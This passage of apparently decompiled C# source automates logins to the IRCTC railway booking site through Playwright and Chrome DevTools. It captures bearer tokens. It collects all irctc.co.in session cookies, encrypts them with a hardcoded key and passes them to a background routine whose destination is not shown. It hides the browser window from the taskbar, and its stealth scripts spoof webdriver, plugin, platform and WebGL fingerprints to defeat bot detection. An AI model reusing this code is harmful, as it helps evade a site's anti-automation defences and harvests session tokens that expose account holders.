                                if (array2.Length >= 5)
                                {
                                    double.TryParse(array2[0], out clsM.minmPsgnInputTime2);
                                    double.TryParse(array2[2], out clsM.minmPsgnInputTime4);
                                    double.TryParse(array2[4], out clsM.minmPsgnInputTime6);
                                }
                                clsMain clsMain2 = clsM;
                                string string_3 = "gender";
                                clsMain2.UserGender = GetString(text2, string_3);
                                string string_4 = "minmPaymentTime";
                                double.TryParse(GetString(text2, string_4).ToUpper(), out clsM.minmPaymentTime);
                                _ = DateTime.Now.Hour;
                                _ = DateTime.Now.Minute;
                                _ = DateTime.Now.Second;
                                clsMain clsMain3 = clsM;
                                string value11 = "Aadhaar authentication of IRCTC user profile is mandatory";
                                clsMain3.AadharVerifyied = !text2.Contains(value11);
                                string value12 = "userEnableState";
                                if (text2.Contains(value12))
                                {
                                    string value13 = "userEnableState\":\"3";
                                    if (text2.Contains(value13))
                                    {
                                        string string_5 = "TBL_USER";
                                        string string_6 = "UserState";
                                        string text5 = "Suspend||";
                                        Class11.smethod_1(string_5, string_6, text5 + class3_0.string_3, class3_0.IRCTC_ID);
                                    }
                                    string value14 = "verified\":\"false";
                                    if (text2.Contains(value14))
                                    {
                                        clsM.Un_Verifyied = true;
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex3)
                    {
                        Exception ex = ex3;
                        string text6 = "[ValidateUser Error]: ";
                        Console.WriteLine(text6 + ex.ToString());
                    }
                }
                string valuec = "insurenceApplicable=";
                if (url.Contains(valuec))
                {
                    try
                    {

                        var cookies = await response.Request.Frame.Page.Context.CookiesAsync();

                        string input = JsonConvert.SerializeObject(cookies.Where(delegate (BrowserContextCookiesResult c)
                        {
                            string domain = c.Domain;
                            string value2 = "irctc.co.in";
                            return domain.Contains(value2);
                        }).ToList(), Formatting.Indented);
                        string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
                        string symmetricKey = text4;
                        string contents = Staticm.EncryptAES(input, symmetricKey);
                        Task.Run(() => traindatabrave(contents));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Cookie read error: " + ex.ToString());
                    }
                }
                string url2 = response.Url;
                string value15 = "webtoken";
                if (url2.Contains(value15))
                {
                    try
                    {
                        string text7 = await response.TextAsync();
                        if (!string.IsNullOrEmpty(text7))
                        {
                            string value16 = "Invalid Captcha";
                            if (text7.Contains(value16))
                            {
                                invalidCaptcha = true;
                            }
                            string value2 = "Incorrect UserName or Password";
                            if (text7.Contains(value2))
                            {
                                invalidUser = true;
                            }
                            string value3 = "Unable to Process Request !!";
                            if (text7.Contains(value3))
                            {
                                string value4 = "Client IP:";
                                if (text7.Contains(value4))
                                {
                                    ipBlock_onLogin = true;
                                }
                            }
                            string value5 = "Access Denied";
                            if (!text7.Contains(value5))
                            {
                                string value6 = "unauthorized";
                                if (!text7.Contains(value6))
                                {
                                    string value7 = "Unable to Process Request !!";
                                    if (!text7.Contains(value7))
                                    {
                                        string value8 = "access_token";
                                        int num = text7.IndexOf(value8);
                                        if (num > 0 && text7.Length > num + 15 + 36)
                                        {
                                            class3_0.string_61 = text7.Substring(num + 15, 36);
                                            clsPostData clsPostData = class3_0;
                                            string text8 = "Bearer ";
                                            clsPostData._Authorization = text8 + class3_0.string_61;
                                            clsM._Authrization = class3_0._Authorization;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex3)
                    {
                        Exception ex2 = ex3;
                        string text9 = "[WebToken Error]: ";
                        Console.WriteLine(text9 + ex2.ToString());
                    }
                }
            }
        };
    }
    internal string GetString(string string_86, string string_87)
    {
        string result = "";
        try
        {
            string text = "\"";
            string text2 = string_86.Substring(string_86.IndexOf(text + string_87));
            string text3 = text2.Substring(text2.IndexOf(string_87) + (string_87.Length + 3));
            string text4 = text3;
            string text5 = text3;
            string value = "\"";
            text3 = text4.Substring(0, text5.IndexOf(value));
            result = text3;
            return result;
        }
        catch
        {
            return result;
        }
    }

    public void AdjustBrowser(IPage page, string userDataDir, Rectangle rect)
    {
        Random random = new Random();
        IntPtr intPtr = ChromeTaskbarHider.FindBrowserWindowByUserDataDir(userDataDir);
        if (intPtr != IntPtr.Zero)
        {
            ChromeTaskbarHider.HideFromTaskbar(intPtr);
        }
        int num = Screen.PrimaryScreen.WorkingArea.Height - random.Next(225, 250);
        ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
        string method = "Browser.getWindowForTarget";
        JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
        if (result2.HasValue)
        {
            JsonElement valueOrDefault = result2.GetValueOrDefault();
            string propertyName = "windowId";
            if (valueOrDefault.TryGetProperty(propertyName, out var value))
            {
                int @int = value.GetInt32();
                Dictionary<string, object> dictionary = new Dictionary<string, object>();
                string key = "windowId";
                dictionary[key] = @int;
                string key2 = "bounds";
                Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                string key3 = "width";
                dictionary2[key3] = rect.Width;
                string key4 = "height";
                dictionary2[key4] = num;
                dictionary[key2] = dictionary2;
                Dictionary<string, object> args = dictionary;
                string method2 = "Browser.setWindowBounds";
                result.SendAsync(method2, args).GetAwaiter().GetResult();
                string value2 = "Browser connected and login injected";
                Console.WriteLine(value2);
                return;
            }
        }
        string message = "windowId property not found in windowInfo.";
        throw new InvalidOperationException(message);
    }

    public static Process LaunchBrowser(string browser, int port, string profileDir)
    {
        string text = "";
        string text2 = browser.ToLower();
        string text3 = "edge";
        if (text2 != text3)
        {
            string text4 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
            text = text4;
        }
        else
        {
            string text5 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
            text = text5;
        }
        string text6 = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>Loading...</title>\r\n<style>\r\nbody{\r\nbackground:#000;\r\ndisplay:flex;\r\nalign-items:center;\r\njustify-content:center;\r\nheight:100vh;\r\ncolor:white;\r\nfont-family:Arial;\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n<h2>Initializing Browser...</h2>\r\n</body>\r\n</html>";
        string s = text6;
        Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
        string format = "--remote-debugging-port={0} ";
        string text7 = string.Format(format, port);
        string text8 = "--user-data-dir=\"";
        string text9 = "\" --new-window --no-first-run --no-default-browser-check --disable-infobars --disable-popup-blocking --disable-notifications --disable-gpu --password-store=basic --disable-renderer-backgrounding --disable-backgrounding-occluded-windows --disable-features=IsolateOrigins,site-per-process --lang=en-US,en ";
        string text10 = text7 + text8 + profileDir + text9;
        string text11 = browser.ToLower();
        string text12 = "edge";
        if (text11 != text12)
        {
            string text13 = text10;
            string text14 = "--disable-sync --disable-features=msEdgeAccountConsistency --disable-features=EdgeSignin ";
            text10 = text13 + text14;
        }
        return Process.Start(new ProcessStartInfo
        {
            FileName = text,
            Arguments = text10,
            UseShellExecute = false,
            CreateNoWindow = true
        });
    }

    public static Process LaunchChrome(int port, string profileDir)
    {
        string text = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        string fileName = text;
        string format = "--remote-debugging-port={0} ";
        string text2 = string.Format(format, port);
        string text3 = "--user-data-dir=\"";
        string text4 = "\" --profile-directory=Default --disable-infobars --disable-notifications --no-first-run ";
        string arguments = text2 + text3 + profileDir + text4;
        return Process.Start(new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            CreateNoWindow = true
        });
    }

    public static IBrowser ConnectCDP(int port)
    {
        IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult()
            .Chromium;
        string format = "http://127.0.0.1:{0}";
        return chromium.ConnectOverCDPAsync(string.Format(format, port)).GetAwaiter().GetResult();
    }

    public static IPage GetPage(IBrowser browser)
    {
        IBrowserContext browserContext = browser.Contexts.FirstOrDefault();
        if (browserContext == null)
        {
            browserContext = browser.NewContextAsync().GetAwaiter().GetResult();
        }
        IPage page = browserContext.Pages.FirstOrDefault();
        if (page == null)
        {
            page = browserContext.NewPageAsync().GetAwaiter().GetResult();
        }
        return page;
    }

    public static void InjectLogin(IPage page, string user, string pass)
    {
        string expression = "\r\n        (data) => {\r\n            window.__BMW_CREDS = {\r\n                user: data.user,\r\n                pass: data.pass\r\n            };\r\n        }";
        page.EvaluateAsync(expression, new { user, pass }).GetAwaiter().GetResult();
    }

    public static void ApplyStealth0(IPage page)
    {
        string expression = "\r\n        () => {\r\n            Object.defineProperty(navigator,'webdriver',{\r\n                get: () => undefined\r\n            });\r\n\r\n            Object.defineProperty(navigator,'languages',{\r\n                get: () => ['en-US','en']\r\n            });\r\n\r\n            Object.defineProperty(navigator,'platform',{\r\n                get: () => 'Win32'\r\n            });\r\n        }\r\n    ";
        page.EvaluateAsync(expression).GetAwaiter().GetResult();
    }

    public static void ApplyStealth(IPage page)
    {
        string expression = "\r\n        () => {\r\n\r\n            // webdriver hide\r\n            Object.defineProperty(navigator,'webdriver',{\r\n                get: () => undefined\r\n            });\r\n\r\n            // languages spoof\r\n            Object.defineProperty(navigator,'languages',{\r\n                get: () => ['en-US','en']\r\n            });\r\n\r\n            // platform spoof\r\n            Object.defineProperty(navigator,'platform',{\r\n                get: () => 'Win32'\r\n            });\r\n\r\n            // plugins spoof\r\n            Object.defineProperty(navigator, 'plugins', {\r\n                get: () => [1,2,3,4,5]\r\n            });\r\n\r\n            // chrome runtime mock\r\n            if(!window.chrome){\r\n                window.chrome = {\r\n                    runtime: {}\r\n                };\r\n            }\r\n\r\n            // permissions fix\r\n            const originalQuery = window.navigator.permissions.query;\r\n            window.navigator.permissions.query = (parameters) => (\r\n                parameters.name === 'notifications'\r\n                    ? Promise.resolve({ state: Notification.permission })\r\n                    : originalQuery(parameters)\r\n            );\r\n\r\n            // hardwareConcurrency spoof\r\n            Object.defineProperty(navigator,'hardwareConcurrency',{\r\n                get: () => 4\r\n            });\r\n\r\n            // WebGL spoof\r\n            const getParameter = WebGLRenderingContext.prototype.getParameter;\r\n            WebGLRenderingContext.prototype.getParameter = function(parameter) {\r\n\r\n                // UNMASKED_VENDOR_WEBGL\r\n                if (parameter === 37445) {\r\n                    return 'Google Inc. (NVIDIA)';\r\n                }\r\n\r\n                // UNMASKED_RENDERER_WEBGL\r\n                if (parameter === 37446) {\r\n                    return 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050)';\r\n                }\r\n\r\n                return getParameter.call(this, parameter);\r\n            };\r\n\r\n        }\r\n    ";
        page.EvaluateAsync(expression).GetAwaiter().GetResult();
    }
}
